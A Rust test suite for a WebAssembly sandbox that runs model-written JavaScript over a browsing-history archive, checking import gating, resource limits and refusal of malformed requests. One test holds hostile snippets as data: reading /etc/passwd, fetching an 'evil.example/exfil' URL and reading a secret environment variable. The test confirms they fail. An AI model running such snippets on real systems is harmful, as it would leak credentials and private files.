//! Code-mode sandbox tests (W-AI-8 WU-1).
//!
//! These run the REAL Wasmtime + scoped-WASI runtime against the REAL committed Javy guest (or a
//! crafted guest where the attack needs one): the security properties (no dangerous authority, the
//! integrity pin, the resource limits, refusal of malformed guest requests) and completeness of the
//! host API at scale. They are the contract, so they must not be stubbed.

use super::*;
use crate::ai::tests::native::fixtures::{SeedVisit, seed_visits};
use crate::models::{AppConfig, ArchiveMode};

/// A multi-thread tokio runtime: REQUIRED so the host fn's `block_in_place` + `Handle::block_on`
/// is valid (block_in_place panics on a current-thread runtime). Mirrors the worker's runtime.
///
/// Uses 4 worker threads so a `block_in_place` retrieval always leaves spare workers even under
/// the full parallel test sweep (a 2-thread pool can starve when many runtimes contend).
fn runtime() -> tokio::runtime::Runtime {
    tokio::runtime::Builder::new_multi_thread()
        .worker_threads(4)
        .enable_all()
        .build()
        .expect("multi-thread runtime")
}

fn base_config() -> AppConfig {
    let mut config = AppConfig {
        initialized: true,
        archive_mode: ArchiveMode::Plaintext,
        git_enabled: false,
        ..AppConfig::default()
    };
    config.ai.enabled = true;
    config.ai.assistant_enabled = true;
    config
}

/// A context over a fresh temp Vault whose archive is empty. Each query_history is a real but
/// fast search that returns zero rows honestly, which the security and limit tests rely on.
fn empty_context() -> AgentToolContext {
    let vault = crate::Vault::open_temp().unwrap();
    AgentToolContext {
        paths: vault.paths().clone(),
        vault,
        config: base_config(),
        database_key: None,
        embedding_provider: None,
        default_profile_id: None,
        default_domain: None,
        default_limit: 8,
        // These code_mode tests pass `control` directly to `run_code_in_sandbox`/`execute_guest`,
        // not through the tool context, so the context's own hook stays `None`.
        run_control: None,
        // Tests pin UTC so the LOCAL-time rendering stays deterministic regardless of the host clock.
        time_zone: chrono_tz::UTC,
    }
}

/// One `chrome:Default` visit at an explicit Unix-ms time, with `history_id` as its visit id.
fn visit_at(history_id: i64, url: &str, title: &str, visit_ms: i64) -> SeedVisit {
    SeedVisit::unix_ms(history_id, "chrome:Default", url, Some(title), visit_ms)
}

/// A context with two real visits, for host-API correctness.
fn seeded_context() -> AgentToolContext {
    let context = empty_context();
    let visit_ms = 13_300_000_000_000_i64;
    seed_visits(
        &context.vault,
        vec![
            visit_at(101, "https://www.rust-lang.org/learn", "Learn Rust", visit_ms),
            visit_at(102, "https://tauri.app/start", "Tauri Start", visit_ms),
        ],
    );
    context
}

/// Sets the per-thread wall-time budget override for the lifetime of the returned guard, so a
/// budget/host-call test that must complete many real retrievals is not racing the production 5s
/// clock under the parallel test run. Restores the previous value on drop.
struct WallTimeBudgetGuard(Option<Duration>);
impl WallTimeBudgetGuard {
    fn set(budget: Duration) -> Self {
        let previous = TEST_WALL_TIME_BUDGET.with(|cell| cell.replace(Some(budget)));
        Self(previous)
    }
}
impl Drop for WallTimeBudgetGuard {
    fn drop(&mut self) {
        TEST_WALL_TIME_BUDGET.with(|cell| cell.set(self.0));
    }
}

// ---- Security CONTRACT — run against the REAL committed Javy guest + scoped WASI --------------

#[test]
fn the_committed_guest_imports_only_scoped_wasi_no_dangerous_authority() {
    // THE no-dangerous-authority contract: introspect the committed Javy module's imports and assert
    // EVERY import is one of the scoped `wasi_snapshot_preview1` fns (fd read/write/seek/close/fdstat,
    // clock, environ, exit). There is NO fs (`path_*`), NO socket (`sock_*`), NO `random_get`, and NO
    // non-WASI module — so the guest cannot reach the filesystem, network, env, or real clock.
    let engine = build_engine().expect("engine");
    let module = Module::new(&engine, GUEST_WASM).expect("compile guest");
    assert_no_dangerous_authority(&module).expect("no dangerous authority");
    for import in module.imports() {
        assert_eq!(
            import.module(),
            ALLOWED_IMPORT_MODULE,
            "only wasi_snapshot_preview1 is allowed"
        );
        assert!(ALLOWED_WASI_FNS.contains(&import.name()), "unexpected WASI fn: {}", import.name());
        // Explicitly: no filesystem, socket, or randomness import sneaks in.
        assert!(!import.name().starts_with("path_"), "no fs path import");
        assert!(!import.name().starts_with("sock_"), "no socket import");
        assert_ne!(import.name(), "random_get", "no WASI randomness import");
        assert_ne!(import.name(), "fd_prestat_get", "no preopen enumeration import");
    }
}

#[test]
fn a_guest_that_imports_fs_is_rejected_before_running() {
    // A would-be malicious guest that tries to import a WASI fs fn (`path_open`, the route to the
    // filesystem) is denied by the import gate — it never instantiates.
    let fs_guest = r#"
        (module
          (import "wasi_snapshot_preview1" "path_open"
            (func $path_open (param i32 i32 i32 i32 i32 i64 i64 i32 i32) (result i32)))
          (memory (export "memory") 1)
          (func (export "_start")))
    "#;
    let engine = build_engine().expect("engine");
    let module = Module::new(&engine, fs_guest).expect("compile");
    let denied = assert_no_dangerous_authority(&module).expect_err("fs import must be denied");
    assert!(denied.to_string().contains("dangerous-authority violation"));
}

#[test]
fn a_guest_that_imports_a_non_wasi_module_is_rejected() {
    // A guest importing a non-WASI module (e.g. an attempt to name a custom host fn) is denied: the
    // only import module allowed is wasi_snapshot_preview1.
    let rogue = r#"
        (module
          (import "env" "delete_archive" (func $d))
          (memory (export "memory") 1)
          (func (export "_start")))
    "#;
    let engine = build_engine().expect("engine");
    let module = Module::new(&engine, rogue).expect("compile");
    let denied = assert_no_dangerous_authority(&module).expect_err("non-wasi module denied");
    assert!(denied.to_string().contains("non-WASI module"));
}

#[test]
fn a_guest_that_imports_sockets_is_rejected() {
    // A socket import (the route to the network) is denied before instantiation.
    let sock_guest = r#"
        (module
          (import "wasi_snapshot_preview1" "sock_accept"
            (func $sock_accept (param i32 i32 i32) (result i32)))
          (memory (export "memory") 1)
          (func (export "_start")))
    "#;
    let engine = build_engine().expect("engine");
    let module = Module::new(&engine, sock_guest).expect("compile");
    let denied = assert_no_dangerous_authority(&module).expect_err("socket import denied");
    assert!(denied.to_string().contains("dangerous-authority violation"));
}

#[test]
fn js_using_fs_or_net_globals_fails_safely() {
    // Real JS in the REAL guest that reaches for fs/net globals finds them undefined (QuickJS has no
    // such globals and the guest has no host bridge for them) → an honest CodeOutcome.error, never a
    // host escape or panic. This proves the engine itself exposes no ambient fs/net to user JS.
    let context = empty_context();
    let rt = runtime();
    for snippet in [
        "return require('fs').readFileSync('/etc/passwd');",
        "return fetch('https://evil.example/exfil');",
        "return new XMLHttpRequest();",
        "return process.env.SECRET;",
    ] {
        let outcome = run_code_in_sandbox(snippet, &context, rt.handle().clone(), None);
        assert!(outcome.error.is_some(), "snippet must fail safely: {snippet:?}");
        assert!(outcome.model_text.is_empty(), "no output for a failed snippet: {snippet:?}");
        assert_eq!(outcome.limits_hit, None, "a missing-global is an error, not a limit");
    }
}

#[test]
fn fuel_exhaustion_traps_deterministically() {
    // The deterministic CPU variant: with tiny fuel a busy loop runs out of fuel and traps. This is
    // reproducible (no wall-clock dependence) so it pins the CPU-bound behavior precisely.
    let spin_guest = r#"
        (module
          (memory (export "memory") 2)
          (func (export "_start") (loop $l (br $l))))
    "#;
    let rt = runtime();
    let context = empty_context();
    let outcome = execute_guest(
        spin_guest.as_bytes(),
        "_start",
        "",
        &context,
        rt.handle().clone(),
        None,
        10_000,
    )
    .expect("setup ok");
    assert_eq!(outcome.limits_hit, Some(LimitsHit::Time));
}

#[test]
fn infinite_loop_in_real_js_traps_on_the_wall_time_deadline() {
    // The functional security proof: an infinite loop in REAL guest JS trips the wall-time deadline
    // and yields a clean Time outcome (the epoch ticker traps QuickJS mid-eval). A short test budget
    // keeps it fast.
    let _budget = WallTimeBudgetGuard::set(Duration::from_millis(300));
    let context = empty_context();
    let source = "while (true) {} return 1;";
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);
    assert_eq!(outcome.limits_hit, Some(LimitsHit::Time));
    assert!(outcome.error.is_none());
}

#[test]
fn unbounded_allocation_in_real_js_is_bounded_not_a_host_panic_or_hang() {
    // The production-guest counterpart to the WAT `memory.grow` test below. Drives the REAL
    // committed Javy guest into an allocation storm and proves the storm is BOUNDED — never a host
    // panic/hang, never silent unbounded success.
    //
    // EMPIRICAL (Javy/QuickJS, this build): a JS-level allocation storm does NOT reach the wasm
    // StoreLimits memory cap. QuickJS's OWN allocator refuses the request first and throws a clean
    // JS error ("out of memory" for the array/Uint8Array storms here), which the harness reports via
    // the `error` op → an honest `CodeOutcome.error` with `limits_hit == None` and empty output. The
    // `memory.grow` limiter (→ LimitsHit::Memory) is the OUTER backstop the WAT guest exercises
    // directly; QuickJS simply self-limits below that line. Either way the storm is bounded.
    //
    // So this test asserts the real production contract (a clean bounded JS error, no host panic/hang,
    // no output) rather than forcing a Memory limit the production guest does not actually hit. We
    // outrun the wall clock (30s budget) so the OOM, not the deadline, is what stops the storm.
    let _budget = WallTimeBudgetGuard::set(Duration::from_secs(30));
    let context = empty_context();
    let source = "let a = []; for (;;) { a.push(new Uint8Array(1<<20)); } return a.length;";
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);

    // The storm is bounded: an honest JS OOM error, NOT the wall-time deadline (we outran it), NOT a
    // memory-cap trap (QuickJS self-limits first), and NEVER an unbounded silent success.
    assert_eq!(outcome.limits_hit, None, "QuickJS self-limits below the wasm memory cap");
    assert!(
        outcome.error.as_deref().is_some_and(|e| e.contains("out of memory")),
        "the allocation storm surfaces a clean JS OOM, got: {:?}",
        outcome.error
    );
    assert!(outcome.model_text.is_empty(), "a stormed run produces no distilled output");
}

#[test]
fn unbounded_allocation_traps_on_the_memory_limiter() {
    // A guest that grows memory without bound must trap on the StoreLimits memory cap, not OOM the
    // host. memory.grow returns -1 once the limiter refuses, and this guest then traps via
    // unreachable so the outcome records a Memory limit.
    let grow_guest = r#"
        (module
          (memory (export "memory") 1)
          (func (export "_start")
            (loop $l
              (if (i32.eq (memory.grow (i32.const 100)) (i32.const -1))
                (then (unreachable)))
              (br $l))))
    "#;
    let rt = runtime();
    let context = empty_context();
    let outcome = execute_guest(
        grow_guest.as_bytes(),
        "_start",
        "",
        &context,
        rt.handle().clone(),
        None,
        u64::MAX,
    )
    .expect("setup ok");
    assert_eq!(outcome.limits_hit, Some(LimitsHit::Memory));
}

#[test]
fn host_call_budget_trips_after_the_cap_in_real_js() {
    // Real JS that loops issuing query_history past MAX_HOST_CALLS trips the budget: the host refuses
    // the overflow call (closes the channel → the global throws) and records HostCalls. Exactly
    // MAX_HOST_CALLS retrievals were serviced. An empty archive keeps each call fast + deterministic.
    let _budget = WallTimeBudgetGuard::set(Duration::from_secs(120));
    let context = empty_context();
    let source = r#"
        let i = 0;
        try {
            for (i = 0; i < 1000; i++) { query_history({ query: "x" }); }
        } catch (e) {
            return { serviced: i };
        }
        return { serviced: i };
    "#;
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);
    assert_eq!(outcome.limits_hit, Some(LimitsHit::HostCalls));
    assert_eq!(outcome.host_calls.len() as u32, MAX_HOST_CALLS, "exactly the cap was serviced");
}

#[test]
fn a_huge_output_is_capped_with_a_limit_marker() {
    // Real JS returning more than MAX_OUTPUT_BYTES has its output truncated host-side and the Output
    // limit recorded — the model never receives an unbounded blob.
    let context = empty_context();
    // A string longer than the cap once JSON-encoded.
    let source = "return 'A'.repeat(300000);";
    let rt = runtime();
    let outcome = run_code_in_sandbox(source, &context, rt.handle().clone(), None);
    assert_eq!(outcome.limits_hit, Some(LimitsHit::Output));
    assert_eq!(outcome.model_text.len(), MAX_OUTPUT_BYTES);
}

// ---- Honest failures + refusals (no host panic) ----------------------------------------------

#[test]
fn an_oversized_fetch_ids_list_is_refused() {
    // A fetch_visits over the id cap is refused at the host (the bail branch → channel closes).
    let context = seeded_context();
    let source = format!(
        "return fetch_visits([{}]);",
        (0..(MAX_FETCH_IDS as i64 + 5)).map(|n| n.to_string()).collect::<Vec<_>>().join(",")
    );
    let rt = runtime();
    let outcome = run_code_in_sandbox(&source, &context, rt.handle().clone(), None);
    assert!(outcome.host_calls.is_empty());
    assert!(outcome.error.is_some(), "the refused over-cap fetch threw");
}

// ---- Compile / integrity / setup failures (pure-ish, real runtime where it matters) ----------

#[test]
fn a_failed_integrity_pin_yields_an_honest_outcome_via_the_public_mapping() {
    // Drives the integrity-failure path (a wrong pin) through the SAME error→outcome mapping the
    // public entry uses: fail closed, honest error, no panic.
    let rt = runtime();
    let context = empty_context();
    let outcome =
        run_guest_or_outcome("src", &context, rt.handle().clone(), None, GUEST_WASM, "wrong-pin");
    assert!(outcome.error.as_deref().is_some_and(|e| e.contains("integrity pin")));
    assert!(outcome.model_text.is_empty());
    assert_eq!(outcome.source, "src");
}

#[test]
fn an_oversized_request_frame_poisons_the_channel() {
    // Direct unit test of the host-side framing defense: a frame claiming a length past
    // MAX_REQUEST_FRAME_BYTES poisons the channel (no unbounded buffering), and further writes are
    // ignored. This guards the host even from a hostile guest that bypasses harness.js.
    let context = empty_context();
    let rt = runtime();
    let host = HostState {
        context,
        runtime: rt.handle().clone(),
        control: None,
        source: String::new(),
        host_calls_made: 0,
        output: Vec::new(),
        records: Vec::new(),
        citations: Vec::new(),
        limits_hit: None,
        guest_error: None,
        coverage_incomplete: false,
        in_host_call: Default::default(),
    };
    let mut channel = RpcChannel {
        host,
        request_buf: Vec::new(),
        reply_buf: Vec::new(),
        reply_pos: 0,
        poisoned: false,
    };
    // A length prefix claiming 2 MiB (> the 1 MiB cap).
    let huge_len = (MAX_REQUEST_FRAME_BYTES as u32 + 1).to_le_bytes();
    channel.push_request_bytes(&huge_len);
    assert!(channel.poisoned, "an over-cap frame poisons the channel");
    // A subsequent write is ignored (no buffering, no reply).
    channel.push_request_bytes(b"more bytes");
    assert!(channel.reply_buf.is_empty(), "no reply queued for a poisoned channel");
    assert!(channel.drain_reply(16).is_empty());
}

#[test]
fn an_oversized_raw_write_poisons_the_channel_via_the_buffer_cap() {
    // Defense-in-depth: a single huge write whose bytes do NOT begin with a valid small frame is
    // caught by the RAW buffer cap (MAX_REQUEST_BUFFER_BYTES), independently of the guest's
    // StoreLimits — BEFORE any declared frame length is even trusted. This covers the path the
    // declared-length check (an_oversized_request_frame_poisons_the_channel) does not: the leading
    // length bytes here decode to a SMALL frame (the body just never arrives), so only the host's own
    // buffer bound stops the host from buffering up to the guest's whole linear memory.
    let context = empty_context();
    let rt = runtime();
    let host = HostState {
        context,
        runtime: rt.handle().clone(),
        control: None,
        source: String::new(),
        host_calls_made: 0,
        output: Vec::new(),
        records: Vec::new(),
        citations: Vec::new(),
        limits_hit: None,
        guest_error: None,
        coverage_incomplete: false,
        in_host_call: Default::default(),
    };
    let mut channel = RpcChannel {
        host,
        request_buf: Vec::new(),
        reply_buf: Vec::new(),
        reply_pos: 0,
        poisoned: false,
    };
    // A 4-byte prefix declaring a TINY frame (so the declared-length cap stays silent), then a flood
    // of body bytes far past the raw buffer cap — the frame body for that tiny declared length never
    // completes, so without the raw cap the host would keep buffering unboundedly.
    let mut write = 4u32.to_le_bytes().to_vec();
    write.extend(std::iter::repeat_n(b'A', MAX_REQUEST_BUFFER_BYTES + 1));
    channel.push_request_bytes(&write);
    assert!(channel.poisoned, "an over-cap raw write poisons the channel via the buffer cap");
    assert!(
        channel.request_buf.is_empty(),
        "the poisoned buffer is cleared (no unbounded retention)"
    );
    // A subsequent write is ignored (no buffering, no reply) — the channel stays closed for the guest.
    channel.push_request_bytes(b"more bytes");
    assert!(channel.reply_buf.is_empty(), "no reply queued for a poisoned channel");
    assert!(channel.drain_reply(16).is_empty());
}

#[test]
fn service_request_refuses_an_unknown_op_and_malformed_json() {
    // The RPC service refuses an unknown op and malformed JSON (returns None → channel closes), never
    // a panic. Exercised directly so the refusal contract is pinned without a bespoke guest.
    let context = empty_context();
    let rt = runtime();
    let mut host = HostState {
        context,
        runtime: rt.handle().clone(),
        control: None,
        source: "the source".to_string(),
        host_calls_made: 0,
        output: Vec::new(),
        records: Vec::new(),
        citations: Vec::new(),
        limits_hit: None,
        guest_error: None,
        coverage_incomplete: false,
        in_host_call: Default::default(),
    };
    // Unknown op → refused.
    assert!(host.service_request(br#"{"op":"delete_everything"}"#).is_none());
    // Malformed JSON → refused.
    assert!(host.service_request(b"not json at all").is_none());
    // The `source` op always answers with the staged source (no budget consumed).
    let reply = host.service_request(br#"{"op":"source"}"#).expect("source op answers");
    let value: Value = serde_json::from_slice(&reply).unwrap();
    assert_eq!(value["source"], "the source");
    assert_eq!(host.host_calls_made, 0, "source does not consume the budget");
}

/// A bare [`HostState`] over an empty context for direct unit tests of the pure host logic.
fn bare_host(rt: &tokio::runtime::Runtime) -> HostState {
    let context = empty_context();
    HostState {
        context,
        runtime: rt.handle().clone(),
        control: None,
        source: String::new(),
        host_calls_made: 0,
        output: Vec::new(),
        records: Vec::new(),
        citations: Vec::new(),
        limits_hit: None,
        guest_error: None,
        coverage_incomplete: false,
        in_host_call: Default::default(),
    }
}

#[test]
fn service_request_refuses_a_host_call_with_malformed_args() {
    // A query_history / fetch_visits op whose `args` cannot deserialize into the typed struct (e.g. a
    // string where an object is expected) is refused at parse time (None → channel closes), never a
    // panic. This pins the args-parse branch in service_request without a bespoke guest.
    let rt = runtime();
    let mut host = bare_host(&rt);
    assert!(host.service_request(br#"{"op":"query_history","args":"not an object"}"#).is_none());
    assert!(
        host.service_request(br#"{"op":"fetch_visits","args":{"ids":"not an array"}}"#).is_none()
    );
    assert_eq!(host.host_calls_made, 0, "a parse-refused call never reached the budget");
}

#[test]
fn code_mode_pages_and_id_lookups_reach_beyond_the_old_newest_window() {
    let _budget = WallTimeBudgetGuard::set(Duration::from_secs(120));
    let context = empty_context();
    crate::test_support::search::seed_pages(&context.vault, 1107);
    let rt = runtime();
    let source = r#"
        const old=fetch_visits([1,1107,999999]);
        let cursor=null;
        let count=0;
        const seen=new Set();
        do {
            const page=query_history({query:'common',plane:'bm25',sort:'oldest',limit:500,cursor});
            if (!page.searchState.coverageComplete || page.total !== 1107) throw new Error('missing exact coverage');
            for (const row of page.rows) {seen.add(row.id);count++;}
            cursor=page.nextCursor;
        } while(cursor);
        return {old:old.rows.map(row=>row.id),count,unique:seen.size};
    "#;
    let outcome = super::run_code_in_sandbox(source, &context, rt.handle().clone(), None);
    assert!(outcome.error.is_none(), "{:?}", outcome.error);
    assert_eq!(outcome.limits_hit, None);
    let result: Value = serde_json::from_str(&outcome.model_text).unwrap();
    assert_eq!(result["old"], json!([1, 1107]));
    assert_eq!(result["count"], 1107);
    assert_eq!(result["unique"], 1107);
}
